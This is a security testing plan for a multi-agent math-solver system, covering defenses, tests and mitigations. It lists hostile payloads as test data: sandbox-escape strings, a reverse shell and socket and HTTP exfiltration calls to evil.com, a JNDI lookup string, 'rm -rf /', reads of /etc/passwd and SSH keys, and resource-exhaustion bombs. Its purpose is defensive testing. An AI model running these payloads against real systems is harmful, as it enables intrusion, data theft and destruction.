# Comprehensive Security Testing Research
## Symbo Agentic Reasoners Mathematical Solver

**Date:** 2025-12-15
**Target System:** Symbo Agentic Reasoners Multi-Agent Mathematical Reasoning System
**Scope:** Expression parsing, agent communication, resource management, and sandbox security

---

## Executive Summary

This document provides comprehensive security testing strategies for the Symbo Agentic Reasoners mathematical solver, focusing on Python-specific vulnerabilities and mathematical expression parsing risks. The system has **strong baseline security** with a native symbolic engine (NO SYMPY dependency), multiple security layers, and resource governance.

**Key Security Strengths:**
- ✅ Safe parser with dangerous pattern blacklist (`safe_parser.py`)
- ✅ Resource governor with timeout enforcement (`resource_governor.py`, `watchdog.py`)
- ✅ Security monitor with agent access control (`security_monitor.py`)
- ✅ Sandboxed code evaluation for algorithm discovery (`sandbox_evaluator.py`)
- ✅ Existing security test suite (`test_security.py`)

**Primary Risk Areas:**
1. Expression parser complexity attacks (deeply nested expressions)
2. Native symbolic engine computation bombs
3. Agent message bus security
4. Resource exhaustion via mathematical operations
5. Information leakage through error messages

---

## 1. Input Injection Attacks

### 1.1 Code Injection via Expression Parsing

**Attack Surface:** `safe_parser.py`, `native_symbolic.py`, expression parsing pipeline

**Current Defenses:**
```python
# File: src/symbo_agentic_reasoners/core/safe_parser.py (Lines 63-101)
DANGEROUS_PATTERNS = [
    r'__\w+__',           # Dunder methods
    r'__import__',        # Import function
    r'\beval\s*\(',       # eval() calls
    r'\bexec\s*\(',       # exec() calls
    r'\bopen\s*\(',       # file operations
    r'\bgetattr\s*\(',    # attribute access
    # ... 30+ patterns
]
```

**Attack Vectors to Test:**

#### 1.1.1 Python Introspection Bypass
```python
# Test payloads for bypassing __import__ blacklist
INJECTION_PAYLOADS = [
    # Indirect import via getattr
    "getattr(__builtins__, '__im' + 'port__')('os')",

    # Unicode homoglyphs (similar-looking characters)
    "__іmport__('os')",  # Cyrillic 'і' instead of 'i'

    # Null byte injection
    "__import__\x00('os')",

    # Format string exploitation
    "{0.__class__.__bases__[0].__subclasses__()}".format(object),

    # Lambda obfuscation
    "(lambda: __import__('os'))()['system']('ls')",

    # Constructor access
    "[].__class__.__base__.__subclasses__()[104].__init__.__globals__['sys']",

    # Through type()
    "type('x', (), {'__code__': compile('import os', '', 'exec')})",
]
```

#### 1.1.2 Expression Parser Fuzzing
```python
# Malformed expressions to crash parser
PARSER_FUZZING = [
    "x**" * 1000,                    # Incomplete operators
    "(" * 10000 + ")",               # Extreme nesting (depth bomb)
    "sin(cos(tan(" * 500 + "x" + ")))" * 500,  # Function nesting
    "x + " * 5000,                   # Incomplete expression chain
    "\u202e\u0065\u0078\u0065\u0063", # Right-to-left override (RLO)
    "x\x00\x00y + 1",                # Null byte injection
    "\\x2e\\x2e\\x2f",               # Escaped path traversal
]
```

#### 1.1.3 SQL/LDAP Injection (Agent IDs)
```python
# Agent ID injection tests
AGENT_ID_INJECTIONS = [
    "agent'; DROP TABLE agents; --",
    "agent\x00null_terminator",
    "agent${jndi:ldap://evil.com/a}",  # Log4Shell-style
    "agent<script>alert(1)</script>",   # XSS in logs
    "../../../etc/passwd",              # Path traversal
    "agent\r\nContent-Type: evil",      # CRLF injection
]
```

**Detection Mechanisms:**
```python
# Add to safe_parser.py
def detect_encoding_attacks(expr_str: str) -> bool:
    """Detect Unicode homoglyphs and encoding tricks."""
    import unicodedata

    # Check for mixed scripts (ASCII + Cyrillic)
    scripts = set()
    for char in expr_str:
        script = unicodedata.name(char, '').split()[0]
        scripts.add(script)

    # Alert if suspicious mixing
    if len(scripts) > 2:
        return True  # Potential homoglyph attack

    # Check for zero-width characters
    invisible_chars = ['\u200b', '\u200c', '\u200d', '\ufeff']
    if any(char in expr_str for char in invisible_chars):
        return True

    return False
```

**Mitigation Strategies:**

1. **Enhanced Pattern Matching:**
```python
# Add to DANGEROUS_PATTERNS
r'[\u0400-\u04FF]',  # Cyrillic characters (homoglyph detection)
r'[\u200b-\u200d]',  # Zero-width spaces
r'\ufeff',           # BOM character
r'\\x[0-9a-fA-F]{2}', # Hex escape sequences
```

2. **Input Normalization:**
```python
def normalize_unicode(expr_str: str) -> str:
    """Normalize Unicode to prevent homoglyph attacks."""
    import unicodedata

    # NFKC normalization (canonical decomposition + composition)
    normalized = unicodedata.normalize('NFKC', expr_str)

    # Remove zero-width characters
    normalized = ''.join(c for c in normalized if ord(c) > 31)

    return normalized
```

3. **AST-Based Validation:**
```python
def validate_expression_ast(expr_str: str) -> bool:
    """Validate using Python AST to catch obfuscated code."""
    try:
        tree = ast.parse(expr_str, mode='eval')

        # Whitelist allowed node types
        allowed_nodes = {ast.Expression, ast.BinOp, ast.UnaryOp, ast.Compare,
                        ast.Name, ast.Constant, ast.Call}

        for node in ast.walk(tree):
            if type(node) not in allowed_nodes:
                return False  # Suspicious node type

        return True
    except SyntaxError:
        return False
```

**Example Test Code:**
```python
# File: tests/test_security_injection_advanced.py

import pytest
from symbo_agentic_reasoners.core.safe_parser import safe_parse, SecurityError

class TestAdvancedInjection:
    """Advanced injection attack tests."""

    def test_unicode_homoglyph_blocked(self):
        """Unicode homoglyphs should be detected."""
        homoglyphs = [
            "__іmport__('os')",  # Cyrillic i
            "еxec('code')",      # Cyrillic e
            "opеn('/etc/passwd')", # Mixed scripts
        ]

        for payload in homoglyphs:
            with pytest.raises((SecurityError, ValueError)):
                safe_parse(payload)

    def test_indirect_import_blocked(self):
        """Indirect import via string manipulation."""
        indirect_imports = [
            "getattr(__builtins__, '__im' + 'port__')('os')",
            "globals()['__builtins__']['__import__']('os')",
            "vars(__builtins__)['eval']('1+1')",
        ]

        for payload in indirect_imports:
            with pytest.raises((SecurityError, NameError, KeyError)):
                safe_parse(payload)

    def test_format_string_exploitation(self):
        """Format string attacks should be blocked."""
        format_attacks = [
            "{0.__class__.__mro__[1].__subclasses__()}",
            "{x.__globals__}",
            "{}.format(x.__class__)",
        ]

        for payload in format_attacks:
            with pytest.raises((SecurityError, ValueError, AttributeError)):
                safe_parse(payload)

    def test_null_byte_injection(self):
        """Null bytes should be rejected."""
        null_attacks = [
            "x\x00 + y",
            "sin(x\x00)",
            "import\x00os",
        ]

        for payload in null_attacks:
            with pytest.raises((SecurityError, ValueError)):
                safe_parse(payload)
```

---

## 2. Expression Parser Security

### 2.1 Malicious Expression Crafting

**Attack Surface:** Native symbolic engine, expression simplification

#### 2.1.1 Computation Bombs
```python
# Expressions designed to cause exponential complexity
COMPUTATION_BOMBS = [
    # Exponential expansion bomb
    "(x+1)*(x+1)*(x+1)*...*(*1000 times)",

    # Factorial bomb
    "factorial(100000)",

    # Nested exponentiation
    "x**(y**(z**(w**2)))",

    # Symbolic division bomb
    "(x**1000) / (x**1000 - 1)",  # Near-singular denominator

    # Trigonometric series expansion
    "sin(x)**1000 + cos(x)**1000",

    # Matrix determinant bomb (if supported)
    "det([[x**i + y**j for j in range(50)] for i in range(50)])",
]
```

#### 2.1.2 Infinite Loop Triggers
```python
# Expressions that may cause infinite loops in simplification
INFINITE_LOOP_TRIGGERS = [
    # Recursive definition
    "solve(x - solve(x - solve(x, x), x), x)",

    # Circular substitution
    "subs(x, y, subs(y, x, x))",

    # Limit at infinity with oscillation
    "limit(sin(x)/x * x**x, x, oo)",

    # Series with no convergence
    "series(1/sin(x), x, 0, n=float('inf'))",
]
```

#### 2.1.3 Stack Overflow Attempts
```python
# Deep recursion to trigger stack overflow
STACK_OVERFLOW_PAYLOADS = [
    # Deeply nested parentheses
    "(" * 10000 + "x" + ")" * 10000,

    # Nested function calls
    "sin(" * 5000 + "x" + ")" * 5000,

    # Recursive tree structure
    "f(f(f(f(...))))",  # Auto-generated deep recursion

    # Nested lists/matrices
    "[[[[" * 1000 + "1" + "]]]]" * 1000,
]
```

#### 2.1.4 Memory Exhaustion Expressions
```python
# Expressions designed to consume excessive memory
MEMORY_BOMBS = [
    # Large polynomial expansion
    "(x + 1)**100000",

    # Matrix size bomb
    "Matrix(10000, 10000, lambda i,j: i+j)",

    # Sum with huge range
    "sum(x**i for i in range(1000000))",

    # String/symbol generation
    "symbols('x0 x1 x2 ... x100000')",  # Create 100k symbols

    # Large rational number
    "Rational(10**100000, 1)",
]
```

**Current Defenses:**
```python
# File: src/symbo_agentic_reasoners/core/safe_parser.py (Lines 56-61)
MAX_INPUT_LENGTH = 10000
MAX_NESTING_DEPTH = 50

def _check_nesting_depth(expr_str: str) -> int:
    """Check maximum nesting depth of parentheses/brackets."""
    # Limited to 50 levels
```

**Enhanced Detection:**
```python
# Add to safe_parser.py
def estimate_complexity(expr_str: str) -> int:
    """Estimate computational complexity of expression."""
    complexity = 0

    # Count operators that cause expansion
    complexity += expr_str.count('**') * 10      # Exponentiation
    complexity += expr_str.count('factorial') * 20
    complexity += expr_str.count('expand') * 15
    complexity += expr_str.count('*') * 1
    complexity += expr_str.count('sum') * 5

    # Check for large constants
    import re
    numbers = re.findall(r'\d+', expr_str)
    for num in numbers:
        if int(num) > 1000:
            complexity += len(num) * 2

    return complexity

MAX_COMPLEXITY = 1000  # Configurable threshold

def check_expression_safety(expr_str: str) -> Tuple[bool, str]:
    """Comprehensive safety check before parsing."""
    # Length check
    if len(expr_str) > MAX_INPUT_LENGTH:
        return False, "Expression too long"

    # Nesting depth
    depth = _check_nesting_depth(expr_str)
    if depth > MAX_NESTING_DEPTH:
        return False, f"Nesting too deep: {depth}"

    # Complexity estimate
    complexity = estimate_complexity(expr_str)
    if complexity > MAX_COMPLEXITY:
        return False, f"Expression too complex: {complexity}"

    # Dangerous patterns
    if DANGEROUS_REGEX.search(expr_str):
        return False, "Dangerous pattern detected"

    return True, "OK"
```

**Test Code:**
```python
# File: tests/test_security_parser_bombs.py

import pytest
import time
from symbo_agentic_reasoners.core.safe_parser import safe_parse

class TestParserBombs:
    """Test expression parser against computation bombs."""

    @pytest.mark.timeout(5)  # Must complete in 5 seconds
    def test_exponential_expansion_limited(self):
        """Exponential expansion should be limited."""
        bomb = "(x+1)**1000 * (x+2)**1000"

        start = time.time()
        try:
            result = safe_parse(bomb)
            elapsed = time.time() - start
            assert elapsed < 5.0, "Expansion took too long"
        except (ValueError, MemoryError):
            # Rejection is acceptable
            pass

    @pytest.mark.timeout(2)
    def test_factorial_bomb_rejected(self):
        """Large factorials should be rejected or limited."""
        with pytest.raises((ValueError, MemoryError, OverflowError)):
            safe_parse("factorial(100000)")

    @pytest.mark.timeout(3)
    def test_nested_exponentiation_limited(self):
        """Nested exponentiation should be limited."""
        bomb = "x**(y**(z**10))"

        try:
            result = safe_parse(bomb)
            # If it succeeds, it should be fast
        except ValueError:
            # Rejection is fine
            pass

    def test_matrix_size_bomb_rejected(self):
        """Large matrix creation should be rejected."""
        with pytest.raises((ValueError, MemoryError)):
            safe_parse("Matrix(10000, 10000, lambda i,j: i+j)")

    def test_deep_nesting_rejected(self):
        """Deeply nested expressions beyond limit."""
        deep = "sin(" * 100 + "x" + ")" * 100

        with pytest.raises(ValueError) as exc_info:
            safe_parse(deep)
        assert "nesting" in str(exc_info.value).lower()
```

### 2.2 Parser-Specific Vulnerabilities

#### 2.2.1 Regex Denial of Service (ReDoS)
```python
# Patterns vulnerable to ReDoS
REDOS_PATTERNS = [
    # Catastrophic backtracking
    "(a+)+b",
    "(a|ab)+c",
    "(a*)*b",

    # With actual math expressions
    "x" + "1" * 10000 + "+" + "2" * 10000,  # If regex checks numeric patterns
]
```

**Detection:**
```python
def check_regex_safety(pattern: str) -> bool:
    """Check if regex pattern is vulnerable to ReDoS."""
    # Detect nested quantifiers
    import re

    # Patterns: (a+)+, (a*)+, (a+)*, (a*)*, etc.
    vulnerable_patterns = [
        r'\([^)]*[+*]\)[+*]',  # (x+)+, (x*)*
        r'\([^)]*\+\)\+',       # (x+)+
        r'\([^)]*\*\)\*',       # (x*)*
    ]

    for vuln in vulnerable_patterns:
        if re.search(vuln, pattern):
            return False  # Unsafe

    return True
```

---

## 3. Denial of Service Vectors

### 3.1 Algorithmic Complexity Attacks

**Attack Surface:** Native symbolic engine operations, simplification, solving

#### 3.1.1 Polynomial GCD Bomb
```python
# Greatest Common Divisor computation bomb
GCD_BOMBS = [
    "gcd(x**1000 - 1, x**999 - 1)",
    "gcd((x**100 + 1)*(x**100 - 1), (x**100 + 2)*(x**100 - 2))",
]
```

#### 3.1.2 Determinant Computation Bomb
```python
# Determinant of large symbolic matrices
DET_BOMBS = [
    "det(Matrix([[x**i*y**j for j in range(20)] for i in range(20)]))",
    "det(Matrix([[i*j*x + i*y + j*z for j in range(15)] for i in range(15)]))",
]
```

#### 3.1.3 Integration Bomb
```python
# Integrals with no closed form or extreme complexity
INTEGRATION_BOMBS = [
    "integrate(sin(x**2), x)",  # No elementary form (Fresnel integral)
    "integrate(exp(x**2), x)",  # Error function (expensive)
    "integrate(1/sqrt(x**3 - x + 1), x)",  # Elliptic integral
    "integrate((x**100 + 1)/(x**100 + x + 1), x)",  # Rational function
]
```

**Current Defenses:**
```python
# File: src/symbo_agentic_reasoners/infrastructure/watchdog.py
# Timeout system with configurable limits
class Watchdog:
    """Operation timeout enforcement."""

    def start_task(self, task_id: str, timeout: float):
        """Start monitoring a task with timeout."""
```

**Enhanced Mitigation:**
```python
# Add operation-specific timeouts
OPERATION_TIMEOUTS = {
    'parse': 1.0,          # 1 second
    'simplify': 5.0,       # 5 seconds
    'solve': 10.0,         # 10 seconds
    'integrate': 30.0,     # 30 seconds (expensive)
    'differentiate': 2.0,  # 2 seconds
    'expand': 5.0,         # 5 seconds
    'factor': 10.0,        # 10 seconds
    'gcd': 5.0,            # 5 seconds
    'determinant': 15.0,   # 15 seconds
}

def with_operation_timeout(operation_type: str):
    """Decorator for operation-specific timeouts."""
    timeout = OPERATION_TIMEOUTS.get(operation_type, 10.0)

    def decorator(func):
        @functools.wraps(func)
        def wrapper(*args, **kwargs):
            import signal

            def timeout_handler(signum, frame):
                raise TimeoutError(f"{operation_type} exceeded {timeout}s")

            # Set alarm (Unix only)
            signal.signal(signal.SIGALRM, timeout_handler)
            signal.alarm(int(timeout))

            try:
                result = func(*args, **kwargs)
                signal.alarm(0)  # Cancel alarm
                return result
            except TimeoutError:
                signal.alarm(0)
                raise

        return wrapper
    return decorator
```

**Test Code:**
```python
# File: tests/test_security_dos.py

import pytest
from symbo_agentic_reasoners.core.solver import solve

class TestDenialOfService:
    """Test DOS protection mechanisms."""

    @pytest.mark.timeout(15)
    def test_gcd_bomb_timeout(self):
        """GCD computation should timeout on excessive input."""
        with pytest.raises((TimeoutError, ValueError)):
            solve("gcd(x**1000 - 1, x**999 - 1)")

    @pytest.mark.timeout(20)
    def test_determinant_bomb_limited(self):
        """Large determinant should be limited."""
        large_matrix = "det(Matrix([[i+j for j in range(50)] for i in range(50)]))"

        with pytest.raises((TimeoutError, MemoryError, ValueError)):
            solve(large_matrix)

    @pytest.mark.timeout(35)
    def test_integration_bomb_timeout(self):
        """Difficult integrals should timeout."""
        with pytest.raises((TimeoutError, NotImplementedError)):
            solve("integrate(sin(x**2)*exp(x**2), x)")

    def test_parallel_dos_resilience(self):
        """System should handle concurrent DOS attempts."""
        import threading

        def dos_attempt():
            try:
                solve("(x+1)**1000 * (x+2)**1000")
            except:
                pass

        threads = [threading.Thread(target=dos_attempt) for _ in range(10)]
        for t in threads:
            t.start()
        for t in threads:
            t.join(timeout=20)

        # System should still be responsive
        result = solve("x + 1")
        assert result is not None
```

### 3.2 Resource Exhaustion Payloads

**Current Defenses:**
```python
# File: src/symbo_agentic_reasoners/infrastructure/resource_governor.py
class ResourceGovernor:
    """Central resource management coordinator."""

    def can_proceed(self, operation_type: str) -> bool:
        """Check if operation can proceed based on resources."""
```

#### 3.2.1 Memory Bombs
```python
# Test memory limits
def test_memory_bomb_detection():
    """System should detect and block memory bombs."""
    from symbo_agentic_reasoners.infrastructure.resource_governor import get_governor

    governor = get_governor()
    governor.start()

    # Attempt large allocation
    memory_bomb = "symbols('x0 x1 x2 ... x10000')"

    # Should be blocked or limited
    if governor.can_proceed('parse'):
        with pytest.raises((MemoryError, ValueError)):
            safe_parse(memory_bomb)
```

#### 3.2.2 Recursive Bombs
```python
RECURSIVE_BOMBS = [
    # Recursive function definition
    "def f(x): return f(x-1) if x > 0 else 0",

    # Mutual recursion
    "def f(x): return g(x-1); def g(x): return f(x-1)",

    # Self-referential expressions
    "x = solve(x + 1, x)",  # If result is used to redefine x
]
```

---

## 4. Sandbox Escape Attempts

### 4.1 File System Access

**Attack Surface:** `sandbox_evaluator.py`, restricted builtins

**Current Defenses:**
```python
# File: src/symbo_agentic_reasoners/discovery/algorithm/sandbox_evaluator.py (Lines 115-147)
restricted_globals = {
    '__builtins__': {
        'range': range,
        'len': len,
        # ... limited builtins, NO open, import, etc.
    }
}
```

#### 4.1.1 File Access Attempts
```python
FILESYSTEM_EXPLOITS = [
    # Direct file access
    "open('/etc/passwd', 'r').read()",
    "open('~/.ssh/id_rsa').read()",

    # Through pathlib
    "from pathlib import Path; Path('/etc/passwd').read_text()",

    # Through subprocess
    "import subprocess; subprocess.run(['cat', '/etc/passwd'])",

    # Through os module
    "import os; os.listdir('/')",
    "import os; os.system('ls -la')",

    # Through importlib
    "import importlib; m = importlib.import_module('os'); m.system('ls')",
]
```

**Test Code:**
```python
def test_filesystem_access_blocked():
    """Verify file system access is completely blocked."""
    from symbo_agentic_reasoners.discovery.algorithm.sandbox_evaluator import (
        SandboxEvaluator
    )

    evaluator = SandboxEvaluator()

    file_access_attempts = [
        "def solve(x): open('/etc/passwd').read(); return x",
        "def solve(x): import os; os.listdir('/'); return x",
        "def solve(x): __import__('pathlib').Path('/').iterdir(); return x",
    ]

    for code in file_access_attempts:
        result = evaluator.evaluate(code, [((1,), 1)])

        # Should fail with ImportError or NameError
        assert result.status in [
            EvaluationStatus.SYNTAX_ERROR,
            EvaluationStatus.RUNTIME_ERROR
        ]
        assert 'import' in result.error_message or 'open' in result.error_message
```

### 4.2 Network Access Attempts

```python
NETWORK_EXPLOITS = [
    # Socket module
    "import socket; s = socket.socket(); s.connect(('evil.com', 1337))",

    # urllib/requests
    "import urllib.request; urllib.request.urlopen('http://evil.com/exfil')",
    "import requests; requests.get('http://evil.com')",

    # DNS exfiltration
    "import socket; socket.gethostbyname('exfil.evil.com')",

    # HTTP server (reverse shell)
    "import http.server; http.server.HTTPServer(('', 8000), None).serve_forever()",
]
```

### 4.3 Process Spawning

```python
PROCESS_EXPLOITS = [
    # subprocess module
    "import subprocess; subprocess.Popen(['bash'])",
    "import subprocess; subprocess.run(['rm', '-rf', '/'])",

    # os.system
    "import os; os.system('bash -i >& /dev/tcp/evil.com/1337 0>&1')",

    # os.exec family
    "import os; os.execv('/bin/sh', ['sh'])",

    # multiprocessing
    "import multiprocessing; multiprocessing.Process(target=malicious_fn).start()",
]
```

### 4.4 Environment Variable Leakage

```python
ENV_LEAKAGE_ATTEMPTS = [
    # Read environment
    "import os; os.environ",
    "import os; os.getenv('SECRET_KEY')",

    # Through sys module
    "import sys; sys.path",  # Reveals file structure

    # Through globals/locals
    "globals()",
    "locals()",
    "vars()",
]
```

**Enhanced Sandbox:**
```python
# Improved restricted_globals for sandbox_evaluator.py
RESTRICTED_BUILTINS = {
    # Safe builtins only
    'abs': abs,
    'all': all,
    'any': any,
    'bool': bool,
    'dict': dict,
    'enumerate': enumerate,
    'filter': filter,
    'float': float,
    'int': int,
    'len': len,
    'list': list,
    'map': map,
    'max': max,
    'min': min,
    'range': range,
    'reversed': reversed,
    'set': set,
    'sorted': sorted,
    'str': str,
    'sum': sum,
    'tuple': tuple,
    'zip': zip,
    # Explicitly exclude dangerous ones
    '__import__': None,
    'compile': None,
    'eval': None,
    'exec': None,
    'open': None,
    'input': None,
    'breakpoint': None,
}

def create_safe_environment():
    """Create maximally restricted execution environment."""
    return {
        '__builtins__': RESTRICTED_BUILTINS,
        '__name__': '__sandbox__',
        '__doc__': None,
        '__package__': None,
        '__loader__': None,
        '__spec__': None,
        # Prevent access to sys/os
        'sys': None,
        'os': None,
    }
```

---

## 5. Data Security

### 5.1 Information Disclosure

#### 5.1.1 Error Message Leakage
```python
# Test for sensitive information in error messages
def test_error_message_safety():
    """Error messages should not leak system information."""
    from symbo_agentic_reasoners.core.safe_parser import safe_parse

    try:
        safe_parse("invalid_expression_!!!")
    except Exception as e:
        error_msg = str(e)

        # Should NOT contain:
        assert '/home/' not in error_msg.lower()
        assert 'c:\\' not in error_msg.lower()
        assert 'password' not in error_msg.lower()
        assert 'secret' not in error_msg.lower()
        assert 'api_key' not in error_msg.lower()

        # Should not reveal internal paths
        assert 'site-packages' not in error_msg
        assert '.py' not in error_msg or 'line' not in error_msg
```

**Mitigation:**
```python
# Add to error_handler.py
def sanitize_error_message(error_msg: str) -> str:
    """Remove sensitive information from error messages."""
    import re

    # Remove file paths
    error_msg = re.sub(r'[A-Za-z]:\\[^\\s]+', '<path>', error_msg)
    error_msg = re.sub(r'/[/\w]+/', '<path>/', error_msg)

    # Remove line numbers that could leak code structure
    error_msg = re.sub(r'line \d+', 'line <num>', error_msg)

    # Remove Python internals
    error_msg = re.sub(r'site-packages[^\s]*', '<module>', error_msg)

    return error_msg
```

#### 5.1.2 Stack Trace Information Leakage
```python
def test_stack_trace_sanitization():
    """Stack traces should not reveal internal structure."""
    from symbo_agentic_reasoners.core.solver import solve

    try:
        solve("definitely_invalid_!!!!")
    except Exception as e:
        import traceback
        tb = traceback.format_exc()

        # In production, stack traces should be sanitized
        # Should not reveal:
        assert not any([
            '/src/symbo_agentic_reasoners/' in tb,
            'def __init__' in tb,  # Internal methods
            'class SecretClass' in tb,  # Internal classes
        ])
```

### 5.2 Timing Attacks

```python
def test_timing_side_channel():
    """Test for timing side channels in expression validation."""
    import time

    # Two expressions: one valid, one with dangerous pattern
    valid_expr = "x + 1"
    danger_expr = "__import__('os')"

    # Measure parsing time
    times_valid = []
    times_danger = []

    for _ in range(100):
        start = time.time()
        try:
            safe_parse(valid_expr)
        except:
            pass
        times_valid.append(time.time() - start)

        start = time.time()
        try:
            safe_parse(danger_expr)
        except:
            pass
        times_danger.append(time.time() - start)

    avg_valid = sum(times_valid) / len(times_valid)
    avg_danger = sum(times_danger) / len(times_danger)

    # Timing difference should not be significant (constant-time validation)
    # Allow for 2x difference maximum
    assert abs(avg_valid - avg_danger) < min(avg_valid, avg_danger) * 2
```

**Mitigation:**
```python
def constant_time_pattern_check(expr_str: str) -> bool:
    """Check for dangerous patterns in constant time."""
    # Always scan entire string, even if match found early
    found_dangerous = False

    for pattern in DANGEROUS_PATTERNS:
        if re.search(pattern, expr_str):
            found_dangerous = True
            # Don't break - continue checking to maintain constant time

    return not found_dangerous
```

### 5.3 Cache Poisoning

```python
# File: tests/test_security_cache.py

def test_cache_poisoning_prevention():
    """Verify result cache cannot be poisoned."""
    from symbo_agentic_reasoners.core.solver import get_solver_engine

    solver = get_solver_engine()

    # Attempt to poison cache with malicious result
    malicious_key = "x + 1"
    malicious_result = "__import__('os').system('ls')"

    # Cache should validate/sanitize all entries
    # This should either fail or the result should be sanitized
    solver.cache[malicious_key] = malicious_result

    # When retrieved, should not execute
    result = solver.solve("x + 1")

    # Result should be safe expression, not code
    assert "__import__" not in str(result)
```

---

## 6. Agent Security

### 6.1 Agent Impersonation

**Attack Surface:** `agent_communication.py`, `message_bus.py`

```python
def test_agent_id_spoofing():
    """Test if agents can impersonate other agents."""
    from symbo_agentic_reasoners.core.message_bus import message_bus, AgentMessage

    # Create message claiming to be from security_monitor
    spoofed_message = AgentMessage(
        sender_id="security_monitor_001",  # Spoofed
        recipient_id="ams",
        message_type=MessageType.REQUEST,
        content={"operation": "shutdown"}
    )

    # Should be validated by recipient
    # AMS should verify sender identity
```

**Mitigation:**
```python
# Add to agent_communication.py
import hmac
import hashlib

class SecureAgentProtocol(AgentProtocol):
    """Enhanced protocol with message authentication."""

    def __init__(self, agent_id: str, secret_key: bytes):
        super().__init__(agent_id)
        self.secret_key = secret_key

    def sign_message(self, message: AgentMessage) -> str:
        """Create HMAC signature for message."""
        payload = f"{message.sender_id}{message.recipient_id}{message.content}"
        signature = hmac.new(
            self.secret_key,
            payload.encode(),
            hashlib.sha256
        ).hexdigest()
        return signature

    def verify_message(self, message: AgentMessage, signature: str) -> bool:
        """Verify message authenticity."""
        expected_sig = self.sign_message(message)
        return hmac.compare_digest(expected_sig, signature)
```

### 6.2 Message Spoofing

```python
def test_message_tampering():
    """Test if messages can be tampered with in transit."""
    from symbo_agentic_reasoners.core.message_bus import message_bus

    # Send legitimate message
    original_msg = AgentMessage(
        sender_id="agent_a",
        recipient_id="agent_b",
        content={"action": "compute", "data": "x+1"}
    )
    message_bus.send_message(original_msg)

    # Attempt to modify in message bus
    # Message should be immutable or have integrity protection
```

### 6.3 Privilege Escalation

```python
def test_cognitive_agent_privilege_escalation():
    """Cognitive agents should not access admin operations."""
    from symbo_agentic_reasoners.infrastructure.security_monitor import SecurityMonitor

    monitor = SecurityMonitor()
    monitor.register_agent("cognitive_agent_001")

    # Attempt admin operation
    decision = monitor.check_access(
        agent_id="cognitive_agent_001",
        resource="admin/config",
        action="write"
    )

    # Should be denied
    assert decision == AccessDecision.DENY
```

### 6.4 Service Registry Manipulation

```python
def test_directory_facilitator_security():
    """DF should prevent unauthorized service registration."""
    from symbo_agentic_reasoners.infrastructure.directory_facilitator import (
        DirectoryFacilitator
    )

    df = DirectoryFacilitator()

    # Attempt to register malicious service
    malicious_service = {
        'service_type': 'system.ams',  # Impersonate AMS
        'agent_id': 'attacker_agent',
        'priority': 999999,  # Try to override
    }

    # Should be rejected or validated
    with pytest.raises((ValueError, SecurityError)):
        df.register(malicious_service)
```

---

## 7. Example Comprehensive Test Suite

```python
# File: tests/test_security_comprehensive.py

import pytest
import time
import threading
from typing import List

class TestComprehensiveSecurity:
    """Comprehensive security test suite."""

    def test_injection_defense_layers(self):
        """Test all injection defense layers."""
        from symbo_agentic_reasoners.core.safe_parser import safe_parse, SecurityError

        injection_vectors = [
            "__import__('os').system('ls')",
            "eval('1+1')",
            "exec('print(1)')",
            "open('/etc/passwd').read()",
            "getattr(__builtins__, 'eval')('1+1')",
            "().__class__.__bases__[0].__subclasses__()",
        ]

        for vector in injection_vectors:
            with pytest.raises((SecurityError, SyntaxError, NameError)):
                safe_parse(vector)

    @pytest.mark.timeout(30)
    def test_dos_resilience(self):
        """System should be resilient to DOS attacks."""
        dos_vectors = [
            "(x+1)**1000",
            "factorial(1000)",
            "sin(" * 100 + "x" + ")" * 100,
        ]

        for vector in dos_vectors:
            start = time.time()
            try:
                safe_parse(vector)
            except (ValueError, TimeoutError, MemoryError):
                pass  # Expected
            elapsed = time.time() - start
            assert elapsed < 10.0, f"DOS vector took {elapsed}s"

    def test_sandbox_isolation(self):
        """Sandbox should be fully isolated."""
        from symbo_agentic_reasoners.discovery.algorithm.sandbox_evaluator import (
            SandboxEvaluator
        )

        evaluator = SandboxEvaluator()

        escape_attempts = [
            "def solve(x): import os; os.system('ls'); return x",
            "def solve(x): open('/etc/passwd').read(); return x",
            "def solve(x): __import__('socket').socket(); return x",
        ]

        for code in escape_attempts:
            result = evaluator.evaluate(code, [((1,), 1)])
            assert result.status != EvaluationStatus.SUCCESS

    def test_information_leakage_prevention(self):
        """System should not leak sensitive information."""
        from symbo_agentic_reasoners.core.solver import solve

        try:
            solve("invalid!!!expression@@@")
        except Exception as e:
            error_msg = str(e).lower()

            # Should not contain sensitive paths
            sensitive_patterns = [
                '/home/', 'c:\\users\\', '/root/',
                'password', 'secret', 'api_key',
                'site-packages', '__pycache__'
            ]

            for pattern in sensitive_patterns:
                assert pattern not in error_msg

    def test_agent_security_isolation(self):
        """Agents should be properly isolated."""
        from symbo_agentic_reasoners.infrastructure.security_monitor import (
            SecurityMonitor, AccessDecision
        )

        monitor = SecurityMonitor()

        # Register normal agent
        monitor.register_agent("normal_agent")

        # Attempt to access restricted resources
        restricted_resources = [
            "admin/config",
            "system/shutdown",
            "ams/terminate",
        ]

        for resource in restricted_resources:
            decision = monitor.check_access("normal_agent", resource, "write")
            assert decision in [AccessDecision.DENY, AccessDecision.AUDIT]

    def test_concurrent_attack_resilience(self):
        """System should handle concurrent attacks."""
        attack_count = 0
        success_count = 0

        def attack_thread():
            nonlocal attack_count, success_count
            attack_count += 1
            try:
                safe_parse("__import__('os').system('ls')")
                success_count += 1  # Should not happen
            except:
                pass  # Expected

        # Launch 50 concurrent attacks
        threads = [threading.Thread(target=attack_thread) for _ in range(50)]
        for t in threads:
            t.start()
        for t in threads:
            t.join(timeout=5)

        assert success_count == 0, "Some attacks succeeded!"
        assert attack_count == 50, "Not all attacks were attempted"

        # System should still be functional
        result = safe_parse("x + 1")
        assert result is not None
```

---

## 8. Security Monitoring & Alerting

### 8.1 Security Event Detection

```python
# Add to security_monitor.py
class SecurityEventDetector:
    """Detect security events in real-time."""

    def __init__(self):
        self.event_log = []
        self.anomaly_threshold = 10  # Events per minute

    def log_event(self, event_type: str, details: Dict):
        """Log security event."""
        event = {
            'timestamp': datetime.now(),
            'type': event_type,
            'details': details
        }
        self.event_log.append(event)

        # Check for anomalies
        self.check_anomalies()

    def check_anomalies(self):
        """Detect anomalous patterns."""
        now = datetime.now()
        recent_window = now - timedelta(minutes=1)

        # Count recent events
        recent_events = [
            e for e in self.event_log
            if e['timestamp'] > recent_window
        ]

        if len(recent_events) > self.anomaly_threshold:
            self.raise_alert(
                severity=AlertSeverity.HIGH,
                message=f"Anomaly detected: {len(recent_events)} events in 1 minute"
            )
```

### 8.2 Intrusion Detection Patterns

```python
# Security patterns to detect
INTRUSION_PATTERNS = {
    'injection_attempt': [
        '__import__', 'eval', 'exec', 'open',
        '__builtins__', '__globals__', 'getattr'
    ],
    'dos_attempt': [
        'factorial(1000)', '**(', '**1000',
